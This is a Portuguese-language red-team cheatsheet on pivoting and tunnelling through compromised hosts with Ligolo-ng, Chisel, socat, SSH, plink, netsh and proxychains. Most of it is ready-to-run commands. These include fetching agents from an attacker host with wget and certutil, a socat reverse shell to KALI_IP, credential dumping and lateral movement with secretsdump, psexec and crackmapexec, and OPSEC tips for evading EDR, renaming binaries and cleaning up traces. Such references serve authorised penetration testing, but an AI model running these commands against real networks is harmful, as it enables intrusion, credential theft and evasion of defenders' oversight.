---
title: "Pivoting Cheatsheet"
---

# Pivoting — Cheatsheet Completo

> Referencia de tecnicas de pivoting e tunelamento para Red Team.
> Ferramentas lado a lado com comandos completos e casos de uso.

---

## Tabela Comparativa de Ferramentas

| Ferramenta  | OS Alvo | Direcao     | SOCKS | Auth | Protocolo | Notas                        |
|-------------|---------|-------------|-------|------|-----------|------------------------------|
| Ligolo-ng   | Win/Lin | Agent -> Proxy | Sim (via rota) | TLS cert | TLS | Interface TUN, sem proxychains |
| Chisel      | Win/Lin | Client -> Server | Sim (R:1080:socks) | user:pass | HTTP/WS | Simples, detectavel por EDR |
| SSH -D      | Lin/Win | Qualquer    | Sim   | SSH  | SSH       | Nativo, requer SSH no pivot  |
| SSH -L      | Lin/Win | Local forward | Nao  | SSH  | SSH       | Port forward especifico      |
| SOCAT       | Lin     | Manual      | Nao   | Nao  | TCP/UDP   | Relay simples, leve          |
| Plink       | Win     | Reverse SSH | Sim   | SSH  | SSH       | PuTTY CLI, sem instalacao    |
| Netsh       | Win     | Port forward| Nao   | N/A  | Nativo Win| Requer admin, nao precisa de exe |

---

## 1. LIGOLO-NG

> Interface TUN virtual — acesso direto sem proxychains. Melhor opcao para redes complexas.

### Arquitetura

```
[Kali/Operador] <-- TLS -- [Agent no Pivot] --> [Rede Interna]
  Interface: ligolo (TUN)
  Rota: ip route add 192.168.1.0/24 dev ligolo
```

### Setup no Kali (Proxy/Servidor)

```bash
# Download
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy-linux-amd64 -O ligolo-proxy
chmod +x ligolo-proxy

# Criar interface TUN (uma vez por sessao)
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Iniciar proxy com certificado auto-assinado
sudo ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Iniciar proxy com certificado customizado
sudo ./ligolo-proxy -certfile cert.pem -keyfile key.pem -laddr 0.0.0.0:11601
```

### Setup no Pivot (Agent)

```bash
# Linux
wget http://KALI_IP/agent -O agent && chmod +x agent
./agent -connect KALI_IP:11601 -ignore-cert

# Windows
certutil -urlcache -split -f http://KALI_IP/agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert

# Modo bind (se firewall bloquear saida do agent — Kali conecta no pivot)
./agent -bind 0.0.0.0:11601
# No proxy: connect PIVOT_IP:11601
```

### Interface Interativa do Proxy

```bash
# Listar sessions conectadas
session

# Selecionar session (numero ou Enter)
1

# Ver interfaces do agent
ifconfig

# Iniciar tunnel
start

# Parar tunnel
stop

# Ajuda
help
```

### Adicionar Rotas para Rede Interna

```bash
# Adicionar rota para a rede alvo via interface ligolo
sudo ip route add 192.168.1.0/24 dev ligolo
sudo ip route add 10.10.10.0/24 dev ligolo

# Verificar conectividade
ping 192.168.1.50
nmap -sV -p 80,443,445 192.168.1.50   # Direto, sem proxychains!
```

### Port Forwarding com Ligolo (Listener)

```bash
# No menu do proxy — adicionar listener para redirecionar porta
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080 --tcp

# Exemplos uteis:
# Expor porta 80 do Kali para a rede interna (para servidores de payload)
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp

# Escutar reverse shell da rede interna
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# Listar listeners
listener_list

# Remover listener
listener_stop 0
```

### Multi-Hop (Pivoting Duplo)

```bash
# Cenario: Kali -> Pivot1 -> Pivot2 -> Rede3

# 1. Agent do Pivot1 ja conectado, rota para rede de Pivot1 adicionada
sudo ip route add 10.10.10.0/24 dev ligolo

# 2. Criar listener no proxy para o Pivot2 se conectar VIA Pivot1
# Na interface do proxy:
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp

# 3. Transferir agent para Pivot2 via tunel do Ligolo
scp agent user@10.10.10.50:~/agent
# ou via wget no Pivot2 apontando para o listener do Kali
# wget http://192.168.1.10:80/agent (192.168.1.10 = Pivot1, listener redireciona para Kali)

# 4. Executar agent no Pivot2 conectando em Pivot1 (que redireciona para Kali)
ssh user@10.10.10.50 "./agent -connect 10.10.10.10:11602 -ignore-cert"
# 10.10.10.10 = Pivot1 IP

# 5. Nova session aparece no proxy do Kali
# Selecionar session de Pivot2: session -> 2 -> start
sudo ip route add 172.16.0.0/24 dev ligolo

# 6. Acesso direto a Rede3
ping 172.16.0.100  # Funciona!
```

---

## 2. CHISEL

> Tunnel TCP/UDP via HTTP. Rapido de configurar. Ideal para pivot unico.

### Servidor (Kali)

```bash
# Download
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && mv chisel_linux_amd64 chisel && chmod +x chisel

# Iniciar servidor com conexoes reversas
./chisel server --reverse --port 8080

# Com autenticacao
./chisel server --reverse --port 8080 --auth user:Password123

# Com TLS
./chisel server --reverse --port 8080 --tls-key key.pem --tls-cert cert.pem

# Em porta 443 (firewall evasion)
sudo ./chisel server --reverse --port 443
```

### Cliente no Pivot

```bash
# SOCKS5 reverso — mais util (porta 1080 no Kali)
./chisel client KALI_IP:8080 R:1080:socks

# Port forward reverso — Kali:4444 -> TARGET:445 via pivot
./chisel client KALI_IP:8080 R:4444:192.168.1.50:445

# Port forward local — pivot expoe recurso interno localmente no Kali
./chisel client KALI_IP:8080 3306:192.168.1.100:3306

# Multiplos encaminhamentos simultaneos
./chisel client KALI_IP:8080 R:1080:socks R:4445:192.168.1.50:445 R:3390:192.168.1.50:3389

# Windows
chisel.exe client KALI_IP:8080 R:1080:socks
chisel.exe client KALI_IP:8080 R:4444:192.168.1.50:445

# Com autenticacao
./chisel client KALI_IP:8080 --auth user:Password123 R:1080:socks
```

### Usar com Proxychains

```bash
# /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

proxychains nmap -sT -Pn -p 445,3389,5985 192.168.1.0/24
proxychains crackmapexec smb 192.168.1.0/24
proxychains psexec.py domain.local/admin:pass@192.168.1.50
proxychains evil-winrm -i 192.168.1.50 -u admin -p password
```

---

## 3. SOCAT

> Relay TCP/UDP simples. Util quando nao ha outras ferramentas disponiveis.

```bash
# Relay TCP basico
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# Relay com bind em IP especifico
socat TCP-LISTEN:8080,bind=10.10.10.50,fork TCP:192.168.1.100:80

# Relay UDP
socat UDP-LISTEN:53,fork UDP:8.8.8.8:53

# Relay com TLS (descriptografar na chegada)
socat TCP-LISTEN:443,fork OPENSSL:192.168.1.50:443,verify=0

# Relay bidirecional com log (-v)
socat -v TCP-LISTEN:8080,fork TCP:192.168.1.50:80

# RDP relay
socat TCP-LISTEN:3389,fork TCP:192.168.1.100:3389

# MSSQL relay
socat TCP-LISTEN:1433,fork TCP:192.168.1.100:1433

# Shell reverso completo (TTY)
# No alvo:
socat TCP:KALI_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# No Kali:
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444,reuseaddr

# Encadeamento de socat (relay duplo)
# Pivot com duas NICs: 10.10.10.50 (externo) e 192.168.1.50 (interno)
socat TCP-LISTEN:3389,bind=10.10.10.50,fork TCP:192.168.1.100:3389
```

---

## 4. SSH — PORT FORWARDING

### Local Forward (-L)

```bash
# Sintaxe: ssh -L [bind:]local_port:dest_host:dest_port user@jump_host

# RDP para host interno via pivot
ssh -L 13389:192.168.1.50:3389 user@PIVOT_IP -N
xfreerdp /v:localhost:13389 /u:admin /p:pass

# SMB para host interno
ssh -L 1445:192.168.1.50:445 user@PIVOT_IP -N
smbclient -L //localhost:1445/ -U admin

# MSSQL para host interno
ssh -L 1433:192.168.1.100:1433 user@PIVOT_IP -N
mssqlclient.py sa:pass@localhost

# Bind em todas as interfaces (expoe para rede do Kali)
ssh -L 0.0.0.0:8080:192.168.1.50:80 user@PIVOT_IP -N

# Multi-hop com ProxyJump
ssh -J user@PIVOT1_IP -L 13389:10.10.10.50:3389 user@PIVOT2_IP -N
```

### Dynamic (-D) — SOCKS Proxy

```bash
# SOCKS proxy na porta 1080
ssh -D 1080 user@PIVOT_IP -N

# Bind em todas as interfaces
ssh -D 0.0.0.0:1080 user@PIVOT_IP -N

# Em background
ssh -f -N -D 1080 user@PIVOT_IP -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null

# Com compressao
ssh -D 1080 -C user@PIVOT_IP -N

# /etc/proxychains4.conf: socks4 127.0.0.1 1080
proxychains nmap -sT -Pn -p 445 192.168.1.0/24
```

### Remote Forward (-R)

```bash
# Sintaxe: ssh -R [bind:]remote_port:dest_host:dest_port user@ssh_server

# Expor porta local do Kali para o pivot (reverse tunnel)
ssh -R 8080:localhost:80 user@PIVOT_IP -N

# Expor servico de outro host ao pivot
ssh -R 4444:192.168.1.50:4444 user@PIVOT_IP -N

# Bind em 0.0.0.0 no pivot (requer GatewayPorts yes no sshd_config)
ssh -R 0.0.0.0:8080:localhost:80 user@PIVOT_IP -N
```

### Flags SSH Uteis

```bash
-N   # Nao executar comando remoto (apenas tunnel)
-f   # Fork para background
-C   # Compressao
-q   # Quiet mode
-o StrictHostKeyChecking=no        # Nao verificar fingerprint
-o UserKnownHostsFile=/dev/null    # Nao salvar fingerprint
-o ConnectTimeout=10               # Timeout de conexao
```

---

## 5. PLINK (PuTTY CLI — Windows)

```cmd
:: Download plink.exe
:: https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe

:: SOCKS5 dinamico reverso — cria SOCKS5 no Kali porta 1080
plink.exe -ssh -pw "password" -D 1080 user@KALI_IP -N

:: Local port forward — Kali porta 13389 -> TARGET:3389
plink.exe -ssh -pw "password" -L 13389:192.168.1.50:3389 user@KALI_IP -N

:: Remote port forward — porta 8080 no Kali -> localhost:80 do pivot
plink.exe -ssh -pw "password" -R 8080:localhost:80 user@KALI_IP -N

:: Aceitar fingerprint automaticamente (modo batch/nao-interativo)
plink.exe -ssh -pw "password" -batch -D 1080 user@KALI_IP -N

:: Via chave RSA (.ppk)
plink.exe -ssh -i chave.ppk -D 1080 user@KALI_IP -N

:: Em background (via START /B)
start /B plink.exe -ssh -pw "password" -D 1080 user@KALI_IP -N

:: Transferir plink para o alvo
certutil -urlcache -split -f http://KALI_IP/plink.exe C:\Windows\Temp\plink.exe
powershell -c "Invoke-WebRequest http://KALI_IP/plink.exe -OutFile C:\Windows\Temp\plink.exe"
```

---

## 6. NETSH PORTPROXY (Windows Nativo)

> Nao requer executaveis externos. Requer privilegios de administrador.

```cmd
:: ADICIONAR regra de port forward
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.100

:: RDP forward
netsh interface portproxy add v4tov4 listenport=13389 listenaddress=0.0.0.0 connectport=3389 connectaddress=192.168.1.50

:: SMB forward
netsh interface portproxy add v4tov4 listenport=1445 listenaddress=0.0.0.0 connectport=445 connectaddress=192.168.1.50

:: LISTAR todas as regras
netsh interface portproxy show all
netsh interface portproxy show v4tov4

:: DELETAR regra especifica
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

:: DELETAR todas as regras (reset)
netsh interface portproxy reset

:: Liberar firewall para a porta
netsh advfirewall firewall add rule name="Pivot8080" protocol=TCP dir=in localport=8080 action=allow

:: Remover regra de firewall
netsh advfirewall firewall delete rule name="Pivot8080"
```

---

## 7. PROXYCHAINS — CONFIGURACAO

### /etc/proxychains4.conf

```ini
# Modo (escolher um)
dynamic_chain       # Pula proxies que falharam — mais robusto
# strict_chain      # Todos os proxies em ordem — falha se qualquer um cair
# round_robin_chain # Distribuir requisicoes entre proxies

# Opcoes
proxy_dns           # Resolver DNS via proxy (IMPORTANTE — evita DNS leak!)
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# SOCKS5 (Ligolo-ng, Chisel, SSH -D)
socks5 127.0.0.1 1080

# SOCKS4 alternativo
# socks4 127.0.0.1 1080

# Chain de proxies (strict_chain)
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081
```

### Uso com Ferramentas

```bash
# Nmap — DEVE usar -sT (TCP connect scan, sem SYN raw)
proxychains nmap -sT -Pn -p 22,80,443,445,3389,5985,8080 192.168.1.50
proxychains nmap -sT -Pn -p 445 --open 192.168.1.0/24

# CrackMapExec
proxychains crackmapexec smb 192.168.1.0/24
proxychains crackmapexec smb 192.168.1.0/24 -u admin -p password --shares
proxychains crackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH

# Impacket
proxychains psexec.py domain.local/Administrator:Password@192.168.1.50
proxychains secretsdump.py domain.local/Administrator:Password@192.168.1.10
proxychains GetUserSPNs.py domain.local/user:pass -dc-ip 192.168.1.10 -request

# Evil-WinRM
proxychains evil-winrm -i 192.168.1.50 -u admin -p password

# Curl
proxychains curl -s http://192.168.1.100/

# Wfuzz
proxychains wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://192.168.1.100/FUZZ

# Burp Suite — configurar em Options > Upstream Proxy: socks5 127.0.0.1:1080
```

---

## 8. CENARIOS PRATICOS

### Cenario 1: Single Pivot Rapido (Chisel + Proxychains)

```
Kali -> (internet) -> Pivot (192.168.1.10) -> (intranet) -> Target (10.10.10.50)
```

```bash
# Kali — iniciar servidor
./chisel server -p 8080 --reverse

# Pivot — conectar e criar SOCKS
./chisel client KALI_IP:8080 R:1080:socks

# Kali — usar
proxychains nmap -sT -Pn -p 445,3389 10.10.10.50
proxychains crackmapexec smb 10.10.10.0/24
proxychains psexec.py domain.local/admin:pass@10.10.10.50
```

### Cenario 2: Duplo Pivot via Ligolo-ng

```
Kali -> Pivot1 (192.168.1.10) -> Pivot2 (10.10.10.50) -> Rede3 (172.16.0.0/24)
```

```bash
# Kali — setup
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Pivot1 — conectar
./agent -connect KALI_IP:11601 -ignore-cert

# Kali — rota para rede de Pivot1 (session 1 -> start)
sudo ip route add 10.10.10.0/24 dev ligolo

# Kali proxy — listener para Pivot2 se conectar via Pivot1
# listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601

# Pivot2 — conectar via Pivot1
./agent -connect 10.10.10.10:11602 -ignore-cert   # 10.10.10.10 = Pivot1

# Kali — rota para Rede3 (session 2 -> start)
sudo ip route add 172.16.0.0/24 dev ligolo

# Kali — acesso direto (sem proxychains!)
nmap -sV 172.16.0.100
crackmapexec smb 172.16.0.0/24
```

### Cenario 3: Windows Pivot Sem Ferramentas (Netsh + Plink)

```
Kali -> (firewall bloqueando entrada) -> Windows Pivot -> Target Interno
```

```cmd
:: Windows Pivot — baixar plink
certutil -urlcache -split -f http://KALI_IP/plink.exe C:\Windows\Temp\plink.exe

:: Criar reverse SSH tunnel com SOCKS dinamico
C:\Windows\Temp\plink.exe -ssh -pw "kalipass" -batch -D 1080 kali@KALI_IP -N

:: OU usar netsh para expor porta interna diretamente
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8888 connectport=445 connectaddress=10.0.0.50
netsh advfirewall firewall add rule name="PivotSMB" protocol=TCP dir=in localport=8888 action=allow

:: Kali acessa diretamente (sem proxy)
smbclient -L //PIVOT_EXTERNAL_IP:8888/ -U admin
crackmapexec smb PIVOT_EXTERNAL_IP:8888 -u admin -p pass
```

---

## 9. OPSEC — PIVOTING

| Tecnica    | Artefato Principal           | Deteccao Provavel         | Mitigacao                   |
|------------|------------------------------|---------------------------|-----------------------------|
| Chisel     | Processo + porta HTTP/WS     | EDR, analise de trafego   | Porta 443, TLS, nome generico |
| SSH -D     | Conexao SSH saindo do host   | Logs SSH, firewall        | Porta 443, dentro de HTTPS  |
| Ligolo-ng  | Processo + interface TUN     | EDR, interface de rede    | Renomear exe, cert legitimo |
| Netsh      | Registry + Event Log 4688    | Event ID 4688, netstat    | Limpar apos uso             |
| SOCAT      | Processo em escuta           | Netstat, EDR              | Via injecao em proc legitimo|
| Plink      | Processo plink.exe           | EDR, nome do processo     | Renomear para nome legitimo |

```bash
# Dicas gerais de OPSEC
# Usar portas 80, 443, 8443 para evadir firewalls
# Usar TLS/HTTPS para criptografar e evitar DPI
# Limitar bandwidth para nao gerar alertas de volumetria
# Deletar binarios de pivoting apos a sessao
# Limpar entradas de netsh, regras de firewall e processos apos uso
# Usar nome de processo convincente (renomear executaveis)
# Tunelamento sobre DNS ou ICMP em ambientes muito restritos
```
